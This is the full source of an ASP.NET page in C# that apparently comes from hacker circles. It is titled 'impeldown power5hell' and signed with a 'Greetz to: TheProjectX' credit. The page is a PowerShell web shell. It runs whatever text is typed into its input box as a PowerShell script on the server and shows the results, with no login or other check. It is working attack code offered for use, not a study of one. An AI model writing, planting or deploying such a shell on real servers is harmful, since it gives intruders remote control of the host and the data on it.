<%@ Page Language=”C#” %>
<%@ Import Namespace=”System.Collections.ObjectModel”%>
<%@ Import Namespace=”System.Management.Automation”%>
<%@ Import Namespace=”System.Management.Automation.Runspaces”%>
<%@ Assembly Name=”System.Management.Automation,Version=1.0.0.0,Culture=neutral,PublicKeyToken=31BF3856AD364E35″%>

<!DOCTYPE html PUBLIC “-//W3C//DTD XHTML 1.0 Transitional//EN” “http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd”>

<script runat=”server”>

private static string Power5hell(string scriptText)
{
try
{
Runspace runspace = RunspaceFactory.CreateRunspace();
runspace.Open();

Pipeline pipeline = runspace.CreatePipeline();
pipeline.Commands.AddScript(scriptText);
pipeline.Commands.Add(“Out-String”);

Collection<PSObject> results = pipeline.Invoke();
runspace.Close();
StringBuilder stringBuilder = new StringBuilder();
foreach (PSObject obj in results)
stringBuilder.AppendLine(obj.ToString());

return stringBuilder.ToString();
}catch(Exception exception)
{
return string.Format(“Error: {0}”, exception.Message);
}
}

protected void Page_Load(object sender, EventArgs e)
{
if (Page.IsPostBack)
{
if(inputTextBox.Text.Length > 0)
{
outputTextBox.Text = Power5hell(inputTextBox.Text.Trim());
inputTextBox.Text = string.Empty;
}
}
}
</script>

<html xmlns=”http://www.w3.org/1999/xhtml”>
<head runat=”server”>
<title>impeldown power5hell</title>
<style type=”text/css”>
.style1
{
color: #0033CC;
font-weight: bold;
}
.style2
{
color: #FFFFFF;
font-weight: bold;
}
</style>
</head>
<body bgcolor=”#000000″>
<form id=”form1″ runat=”server”>
<div style=”color: #FF0000″>

<span>::impeldown</span>
<span>power5hell</span><span>::<br />
Greetz to: TheProjectX</span><span><br />
</span><br />

</div>
<asp:TextBox ID=”outputTextBox” runat=”server” BackColor=”Black”
ForeColor=”#33CC33″ Height=”426px” ReadOnly=”True” TextMode=”MultiLine”
Width=”715px” ToolTip=”Power5hell output”></asp:TextBox>
<br />
<asp:TextBox ID=”inputTextBox” runat=”server” Width=”715px”
ToolTip=”Enter power5hell command here”></asp:TextBox>
</form>
</body>
</html>
